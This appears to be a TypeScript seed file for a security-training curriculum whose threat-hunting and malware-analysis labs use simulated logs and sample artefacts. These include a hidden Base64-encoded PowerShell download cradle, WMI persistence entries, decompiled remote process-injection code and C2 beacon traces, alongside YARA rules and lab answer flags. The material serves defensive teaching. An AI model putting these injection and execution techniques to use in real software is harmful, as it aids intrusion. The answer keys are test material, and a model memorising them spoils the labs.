/**
 * Phoenix Labs Academy — Canonical Edge Curriculum Seed
 *
 * Provides the complete 3-Track, 26-Module curriculum so the Cloudflare Worker
 * can automatically bootstrap an empty D1 database on first request or serve
 * curriculum seamlessly in standalone edge deployments before D1 is bound.
 */

import type { IngestModulePayload, TrackRecord } from './types';
import { PENTEST_TRACK, PHASE_0_TO_3_MODULES } from '../../scripts/course-data-phase0-to-3';
import { PHASE_4_TO_6_MODULES } from '../../scripts/course-data-phase4-to-6';

export const SEED_TRACKS: TrackRecord[] = [
  PENTEST_TRACK,
  {
    id: 'track-hunting',
    slug: 'threat-hunting',
    title: 'Threat Hunting',
    subtitle: 'Hypothesis-Driven Detection',
    description:
      'Move beyond signature alerts: analyze Sysmon, EDR telemetry, and WMI persistence to uncover Living-off-the-Land adversaries.',
    order_index: 2
  },
  {
    id: 'track-malware',
    slug: 'malware-analysis',
    title: 'Malware Engineering',
    subtitle: 'Discovery, Blast Chamber, RE & Remediation',
    description:
      'End-to-end malware lifecycle: discovery triage, isolated blast-chamber detonation, reverse engineering, and YARA remediation.',
    order_index: 3
  }
];

export const HUNTING_AND_MALWARE_MODULES: IngestModulePayload[] = [
  {
    id: 'mod-th-101',
    track_id: 'track-hunting',
    slug: 'lotl-powershell-hunting',
    title: '101: Hunting Encoded Living-off-the-Land (LotL) Execution',
    difficulty: 'Fundamentals',
    order_index: 1,
    estimated_minutes: 20,
    theory_sections: [
      {
        heading: 'Why Signature Alerts Miss LotL',
        body: 'Adversaries rarely drop noisy custom binaries during initial execution when native Windows binaries (`powershell.exe`, `rundll32.exe`, `certutil.exe`) are already present and trusted on every endpoint.'
      },
      {
        heading: 'Pivoting on Sysmon Event ID 1 (Process Creation)',
        body: 'Threat hunters focus on behavioral anomalies rather than static file hashes:\n- **Parent-Child Anomalies**: Normal productivity apps (`WINWORD.EXE`, `EXCEL.EXE`) should never spawn command-line shells.\n- **Command-Line Arguments**: The `-EncodedCommand` (`-Enc`) switch accepts UTF-16LE Base64 strings to hide script logic from casual inspection.'
      }
    ],
    lab_type: 'siem',
    lab_briefing:
      'Filter the Sysmon Event ID 1 telemetry stream to locate the obfuscated PowerShell execution spawned by WINWORD.EXE. Decode the UTF-16LE Base64 payload and submit the hidden C2 stage 2 URL.',
    lab_config: {
      logs: [
        {
          timestamp: '2026-10-16T18:01:12Z',
          host: 'WKSTN-FIN-04',
          event_id: 1,
          parent_image: 'C:\\Windows\\System32\\services.exe',
          image: 'C:\\Windows\\System32\\svchost.exe',
          command_line: 'svchost.exe -k netsvcs -p -s Schedule'
        },
        {
          timestamp: '2026-10-16T18:03:05Z',
          host: 'WKSTN-FIN-04',
          event_id: 1,
          parent_image: 'C:\\Windows\\explorer.exe',
          image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
          command_line:
            '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\analyst\\Downloads\\Invoice_Q3_9918.docm"'
        },
        {
          timestamp: '2026-10-16T18:04:49Z',
          host: 'WKSTN-FIN-04',
          event_id: 1,
          parent_image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
          image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
          command_line:
            'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADkALgA5ADkALwBzAHQAYQBnAGUAMgAuAHAAcwAxAA=='
        },
        {
          timestamp: '2026-10-16T18:06:02Z',
          host: 'WKSTN-FIN-04',
          event_id: 1,
          parent_image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
          image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
          command_line: 'chrome.exe --type=renderer --lang=en-US'
        }
      ]
    },
    expected_flag: 'http://10.10.19.99/stage2.ps1',
    hint: 'Filter by powershell or WINWORD, click Decode Base64 on the -Enc payload, and submit the resulting URL.'
  },
  {
    id: 'mod-th-201',
    track_id: 'track-hunting',
    slug: 'wmi-persistence-consumer-bindings',
    title: '201: Hunting Fileless WMI Event Subscription Persistence',
    difficulty: 'Intermediate',
    order_index: 2,
    estimated_minutes: 25,
    theory_sections: [
      {
        heading: 'Beyond Registry Run Keys',
        body: 'Intermediate adversaries avoid `HKLM\\...\\CurrentVersion\\Run` because modern EDR agents heavily monitor registry autoruns. Instead, they weaponize Windows Management Instrumentation (WMI) event subscriptions to execute arbitrary payloads in response to system triggers without leaving files in Startup folders.'
      },
      {
        heading: 'The WMI Persistence Triad (Sysmon Events 19, 20, 21)',
        body: '1. `__EventFilter` (Event ID 19): Defines the trigger condition (e.g., system uptime > 300s or specific logon).\n2. `__EventConsumer` (Event ID 20): Defines the action (e.g., `CommandLineEventConsumer` executing `rundll32.exe`).\n3. `__FilterToConsumerBinding` (Event ID 21): Glues the trigger and the action together.'
      }
    ],
    lab_type: 'siem',
    lab_briefing:
      'Inspect the Sysmon WMI telemetry (Events 19, 20, 21) across domain controller SRV-AD-02. Identify the malicious CommandLineEventConsumer and submit the exact ConsumerName value.',
    lab_config: {
      logs: [
        {
          timestamp: '2026-10-16T19:12:01Z',
          host: 'SRV-AD-02',
          event_id: 19,
          parent_image: 'WmiEventFilter',
          image: 'ROOT\\subscription:__EventFilter',
          command_line:
            'FilterName="SCM_Health_Trigger" Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
        },
        {
          timestamp: '2026-10-16T19:12:04Z',
          host: 'SRV-AD-02',
          event_id: 20,
          parent_image: 'WmiEventConsumer',
          image: 'ROOT\\subscription:CommandLineEventConsumer',
          command_line:
            'ConsumerName="SysHealthUpdaterC2" Destination="rundll32.exe C:\\ProgramData\\uso_cache.dat,DllRegisterServer"'
        },
        {
          timestamp: '2026-10-16T19:12:05Z',
          host: 'SRV-AD-02',
          event_id: 21,
          parent_image: 'WmiFilterToConsumerBinding',
          image: 'ROOT\\subscription:__FilterToConsumerBinding',
          command_line:
            'Consumer="CommandLineEventConsumer.Name=\\"SysHealthUpdaterC2\\"" Filter="__EventFilter.Name=\\"SCM_Health_Trigger\\""'
        }
      ]
    },
    expected_flag: 'SysHealthUpdaterC2',
    hint: 'Look at Sysmon Event ID 20 (CommandLineEventConsumer) and submit the ConsumerName value.'
  },
  {
    id: 'mod-mw-101',
    track_id: 'track-malware',
    slug: 'blast-chamber-triage-and-iat',
    title: '101: Discovery, Blast Chamber Detonation & IAT Triage',
    difficulty: 'Fundamentals',
    order_index: 1,
    estimated_minutes: 25,
    theory_sections: [
      {
        heading: 'The 4-Stage Malware Engineering Lifecycle',
        body: '1. **Discovery**: Flagging anomalous binaries via section entropy (packed code), unsigned PE headers, or suspicious delivery paths.\n2. **Blast Chamber Detonation**: Running the sample in an instrumented sandbox to observe child processes, dropped artifacts, and network beacons.\n3. **Reverse Engineering**: Decompiling routines in Ghidra/IDA to understand algorithms and config structures.\n4. **Remediation**: Authoring YARA detection signatures and automated containment rules.'
      },
      {
        heading: 'Recognizing Process Injection in the IAT',
        body: "Before opening a disassembler, inspecting a PE file's Import Address Table (IAT) reveals its capabilities. The presence of `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` strongly indicates remote code injection into a legitimate host process."
      }
    ],
    lab_type: 'hex_inspector',
    lab_briefing:
      'Examine the static PE metadata, Blast Chamber detonation trace, and decompiled routine for updater_svc.exe. Identify the external command-and-control (C2) domain contacted after injection.',
    lab_config: {
      sample_name: 'updater_svc.exe (SHA256: 9f86d081884c7d659a2feaa0c55ad015)',
      entropy: '7.42 (High - Packed .rsrc section)',
      imports: [
        'KERNEL32.dll!OpenProcess',
        'KERNEL32.dll!VirtualAllocEx',
        'KERNEL32.dll!WriteProcessMemory',
        'KERNEL32.dll!CreateRemoteThread',
        'WININET.dll!InternetOpenUrlA'
      ],
      strings: [
        'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'Global\\Mtx_Sync_881',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'https://telemetry-cdn-check.net/gate.php'
      ],
      sandbox_trace:
        '[00:01.12] EXEC: Spawned updater_svc.exe (PID 4120)\n[00:01.45] SYNC: Created Mutex "Global\\\\Mtx_Sync_881"\n[00:02.08] INJECT: Allocated 4096 bytes RWX in explorer.exe (PID 1840)\n[00:02.15] INJECT: Wrote shellcode to explorer.exe @ 0x02AB0000\n[00:02.20] THREAD: CreateRemoteThread on explorer.exe -> entry 0x02AB0010\n[00:03.19] NET: DNS Query A -> telemetry-cdn-check.net -> IP 198.51.100.44\n[00:03.35] NET: HTTPS GET https://telemetry-cdn-check.net/gate.php (200 OK)',
      decompiled_c:
        'int __cdecl main() {\n  HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\\\Mtx_Sync_881");\n  if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;\n  DWORD pid = FindProcessByName("explorer.exe");\n  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n  LPVOID rwx = VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n  WriteProcessMemory(hProc, rwx, encrypted_stage, 0x1000, NULL);\n  CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rwx, NULL, 0, NULL);\n  return 0;\n}',
      remediation_yara:
        'rule Malware_Win32_UpdaterSvc_Injector {\n  meta:\n    author = "Phoenix Labs Academy"\n    severity = "Critical"\n  strings:\n    $mutex = "Global\\\\Mtx_Sync_881"\n    $c2 = "telemetry-cdn-check.net"\n  condition:\n    uint16(0) == 0x5A4D and ($mutex or $c2)\n}'
    },
    expected_flag: 'telemetry-cdn-check.net',
    hint: 'Inspect the Extracted Strings or Blast Chamber Detonation tab and submit the domain name.'
  },
  {
    id: 'mod-mw-201',
    track_id: 'track-malware',
    slug: 'xor-config-reverse-engineering-remediation',
    title: '201: Reverse Engineering XOR-Obfuscated Configs & Remediation',
    difficulty: 'Intermediate',
    order_index: 2,
    estimated_minutes: 30,
    theory_sections: [
      {
        heading: 'Defeating Static String Extraction',
        body: 'To prevent analysts from running `strings` on a binary to extract C2 domains and registry keys, malware authors encrypt configuration blocks using simple byte operations like single-byte XOR or RC4.'
      },
      {
        heading: 'Decompilation & Automated Remediation',
        body: 'By examining the decompiled loop in Ghidra or IDA, you can identify the XOR key constant, decode the configuration buffer, and craft an automated YARA signature that detects the decryption routine across binary variations.'
      }
    ],
    lab_type: 'hex_inspector',
    lab_briefing:
      'Switch to the Decompiled RE & YARA tab in the Malware Inspector. Analyze the decompiled XOR decryption function and submit the single-byte hex XOR key used to decrypt the C2 configuration.',
    lab_config: {
      sample_name: 'svc_host_helper.dll (SHA256: 4b227777d4dd1fc61c6f884f48641d02)',
      entropy: '6.89 (.data config encrypted)',
      imports: [
        'ADVAPI32.dll!CreateServiceA',
        'ADVAPI32.dll!StartServiceCtrlDispatcherA',
        'WS2_32.dll!connect',
        'KERNEL32.dll!VirtualProtect'
      ],
      strings: [
        '[ENCRYPTED BLOB @ 0x10004020]: 32 3E 3A 29 05 39 35 28 3F 14 3E 36 36',
        'ServiceDll',
        'SYSTEM\\CurrentControlSet\\Services\\WinDefendCoreSvc'
      ],
      sandbox_trace:
        '[00:00.40] EXEC: rundll32.exe svc_host_helper.dll,InstallSvc\n[00:00.85] MEM : Decrypting 64-byte configuration buffer @ 0x10004020\n[00:01.02] NET : Socket connect 192.0.2.77:4444 (ESTABLISHED)',
      decompiled_c:
        'void __fastcall DecryptConfig(uint8_t *buf, size_t len) {\n  // Single-byte XOR deobfuscation routine\n  const uint8_t xor_key = 0x5A;\n  for (size_t i = 0; i < len; i++) {\n    buf[i] ^= xor_key;\n  }\n}',
      remediation_yara:
        'rule Malware_Win32_SvcHostHelper_XOR {\n  meta:\n    description = "Detects XOR 0x5A decryption loop in svc_host_helper"\n  strings:\n    $xor_loop = { 8A 04 0A 34 5A 88 04 0A 41 49 75 F5 }\n  condition:\n    uint16(0) == 0x5A4D and $xor_loop\n}'
    },
    expected_flag: '0x5A',
    hint: 'Open the Decompiled RE & YARA tab inside the lab pane and check the uint8_t xor_key constant (0x5A).'
  }
];

export const SEED_MODULES: IngestModulePayload[] = [
  ...PHASE_0_TO_3_MODULES,
  ...PHASE_4_TO_6_MODULES,
  ...HUNTING_AND_MALWARE_MODULES
];
